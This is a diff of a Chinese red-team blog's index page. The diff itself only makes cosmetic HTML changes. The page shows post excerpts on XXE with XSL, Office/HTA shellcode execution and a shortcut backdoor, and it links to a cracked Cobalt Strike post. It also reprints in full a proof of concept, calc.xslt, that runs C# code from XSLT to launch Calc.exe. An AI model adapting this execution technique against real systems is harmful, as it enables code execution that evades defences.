@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -90,13 +107,13 @@
   <meta name="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 <meta name="keywords" content="Red Team;Hack;半吊子程序猿,web;">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Evi1cg's blog">
+<meta property="og:title" content="Evi1cg&#39;s blog">
 <meta property="og:url" content="https://evi1cg.github.io/page/9/index.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 <meta property="og:locale" content="zh-CN">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Evi1cg's blog">
+<meta name="twitter:title" content="Evi1cg&#39;s blog">
 <meta name="twitter:description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 
 
@@ -481,14 +498,14 @@
         
           
             <p>
-              当XXE支持XSL时，可以直接执行命令：写shellxsl:stylesheet version="1.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"xmlns:msxsl="urn:s
+              当XXE支持XSL时，可以直接执行命令：写shell&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version="1.0"xmlns:xsl="http://www.w3.org/1999/X
               ...
             </p>
           <!--noindex-->
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/xxe_with_xsl.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -662,7 +679,7 @@
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Shortcut_Backdoor.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -829,14 +846,14 @@
         
           
             <p>
-              From: https://gist.github.com/subTee/e126c6ee847a4d9fcfd7CalcExcel.hta						var objExcel = new ActiveXObject("Excel.Appl
+              From: https://gist.github.com/subTee/e126c6ee847a4d9fcfd7CalcExcel.hta&lt;html&gt;	&lt;head&gt;		&lt;script&gt;			var ob
               ...
             </p>
           <!--noindex-->
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Office_Shellcode_Execution.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -1003,12 +1020,12 @@
         
           <!-- index-menu -->
 <h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>XSLT全称为拓展样式表转换语言，是一种用于将 XML 文档转换为 XHTML 文档或其他 XML 文档的语言。更多关于XSLT的教程可以参考<a href="http://www.w3school.com.cn/xsl/index.asp" target="_blank" rel="noopener">W3school</a>。关于XSLT的hack技巧之前已经有老师总结了<a href="http://bobao.360.cn/learning/detail/378.html" target="_blank" rel="noopener">WebShell系列(一)—XML</a>，里面详细介绍了怎么通过xslt构造webshell，并且可以看的出，通过XSLT可以执行很多类型的脚本，前段时间<a href="https://twitter.com/subTee" target="_blank" rel="noopener">@Casey Smith</a>公开了一个Execute C# From XSLT 的<a href="https://gist.github.com/subTee/c34d0499e232c1501ff9f0a8dd302cbd" target="_blank" rel="noopener">POC</a>，感觉很有趣，所以简单的研究了一下，也就有了此文。</p>
-<h2 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h2><p>Casey Smith分享的poc如下：<br>calc.xslt<br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag"><<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"2.0"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:msxsl</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:my</span>=<span class="string">"urn:MyModule"</span>></span></span><br><span class="line"></span><br><span class="line">  <span class="tag"><<span class="name">msxsl:script</span> <span class="attr">implements-prefix</span>=<span class="string">"my"</span> <span class="attr">language</span>=<span class="string">"C#"</span>></span></span><br><span class="line">    public void Exec()</span><br><span class="line">    {</span><br><span class="line">      System.Diagnostics.Process.Start("Calc.exe");</span><br><span class="line">    }</span><br><span class="line">  <span class="tag"></<span class="name">msxsl:script</span>></span></span><br><span class="line"></span><br><span class="line">  <span class="tag"><<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"data"</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">result</span>></span></span><br><span class="line">      <span class="tag"><<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"my:Exec()"</span> /></span></span><br><span class="line">    <span class="tag"></<span class="name">result</span>></span></span><br><span class="line">  <span class="tag"></<span class="name">xsl:template</span>></span></span><br><span class="line"><span class="tag"></<span class="name">xsl:stylesheet</span>></span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h2><p>Casey Smith分享的poc如下：<br>calc.xslt<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"2.0"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:msxsl</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:my</span>=<span class="string">"urn:MyModule"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">msxsl:script</span> <span class="attr">implements-prefix</span>=<span class="string">"my"</span> <span class="attr">language</span>=<span class="string">"C#"</span>&gt;</span></span><br><span class="line">    public void Exec()</span><br><span class="line">    &#123;</span><br><span class="line">      System.Diagnostics.Process.Start("Calc.exe");</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">msxsl:script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"my:Exec()"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Hack_With_XSLT.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -1190,7 +1207,7 @@
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/CobaltStrike_3_6_Cracked.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -1245,7 +1262,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">…</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">…</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1473,7 +1490,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1484,7 +1501,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1495,7 +1512,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1506,7 +1523,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -1541,7 +1558,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1603,8 +1620,6 @@
 
 
 
-  
-
 
 
 
@@ -1633,9 +1648,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -2061,11 +2073,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -2205,6 +2212,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
